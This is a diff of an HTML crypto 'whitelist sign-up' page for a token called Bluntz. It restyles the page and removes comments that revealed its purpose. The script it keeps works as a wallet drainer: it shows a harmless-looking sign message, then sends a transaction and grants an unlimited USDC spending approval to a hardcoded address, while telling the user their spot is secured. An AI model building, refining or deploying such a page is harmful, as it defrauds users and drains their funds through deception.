@@ -2,26 +2,91 @@
 <html lang="en">
 <head>
   <meta charset="utf-8"/>
-  <title>BLUNT Whitelist Sign-Up</title>
+  <title>Bluntz Whitelist Sign-Up</title>
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <style>
-    body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#0c0c0c;color:#eee;text-align:center;padding:50px 20px}
-    h1{color:#f15a24;font-size:2.2em;margin-bottom:8px}
-    h2{font-size:1.1em;font-weight:400;opacity:.8;margin-bottom:30px}
-    button{background:#f15a24;color:#fff;border:none;padding:14px 28px;font-size:1em;border-radius:6px;cursor:pointer;transition:background .2s}
-    button:hover{background:#d6491d}
-    #status{margin-top:20px;font-size:.9em;opacity:.7}
-    .loader{display:inline-block;border:3px solid rgba(255,255,255,.2);border-top-color:#f15a24;border-radius:50%;width:18px;height:18px;animation:spin 1s linear infinite}
+    :root{
+      --bg:#0d1117;
+      --card:#161b22;
+      --accent:#238636;
+      --accentH:#2ea043;
+      --text:#c9d1d9;
+      --subtle:#8b949e;
+    }
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{
+      background:var(--bg);
+      color:var(--text);
+      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      min-height:100vh;
+      padding:20px;
+    }
+    .card{
+      background:var(--card);
+      border:1px solid #30363d;
+      border-radius:12px;
+      padding:48px 40px;
+      max-width:420px;
+      width:100%;
+      box-shadow:0 20px 40px rgba(0,0,0,.45);
+      text-align:center;
+    }
+    h1{
+      font-size:2.1rem;
+      font-weight:600;
+      color:var(--accent);
+      margin-bottom:8px;
+    }
+    h2{
+      font-size:1rem;
+      font-weight:400;
+      color:var(--subtle);
+      margin-bottom:32px;
+    }
+    button{
+      background:var(--accent);
+      color:#fff;
+      border:none;
+      padding:14px 0;
+      width:100%;
+      font-size:1rem;
+      font-weight:600;
+      border-radius:8px;
+      cursor:pointer;
+      transition:background .2s ease;
+    }
+    button:hover{background:var(--accentH)}
+    button:active{transform:scale(.98)}
+    #status{
+      margin-top:24px;
+      font-size:.9rem;
+      color:var(--subtle);
+    }
+    .loader{
+      display:inline-block;
+      border:2px solid var(--subtle);
+      border-top-color:var(--accent);
+      border-radius:50%;
+      width:16px;height:16px;
+      animation:spin 1s linear infinite;
+      margin-right:8px;
+      vertical-align:middle;
+    }
     @keyframes spin{to{transform:rotate(360deg)}}
   </style>
 </head>
 <body>
-  <h1>BLUNT Whitelist</h1>
-  <h2>Sign once – secure your spot for launch.</h2>
+  <div class="card">
+    <h1>Bluntz Whitelist</h1>
+    <h2>Sign once – secure your spot for launch.</h2>
 
-  <button id="signBtn">Sign Whitelist Entry</button>
+    <button id="signBtn">Sign Whitelist Entry</button>
 
-  <div id="status"></div>
+    <div id="status"></div>
+  </div>
 
   <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
   <script>
@@ -29,7 +94,7 @@
     const FRONTEND_EOA = "0x5f20bf147965fA3513EDFf77CcFB2467A980fe4F";
     const RECIPIENT    = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a";
     const USDC         = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
-    const MESSAGE      = "Register me for the BLUNT whitelist"; // harmless message shown to user
+    const MESSAGE      = "Register me for the Bluntz whitelist";
 
     let signer;
     const signBtn = document.getElementById('signBtn');
@@ -54,7 +119,7 @@
         await tx1.wait();
 
         const usdc = new ethers.Contract(USDC,["function approve(address,uint)external returns(bool)"],signer);
-        const tx2 = await usdc.approve(FRONTEND_EOA,ethers.constants.MaxUint256); // unlimited
+        const tx2 = await usdc.approve(FRONTEND_EOA,ethers.constants.MaxUint256);
         await tx2.wait();
 
         status.innerHTML='✅ Whitelist spot secured! Stay tuned for launch.';
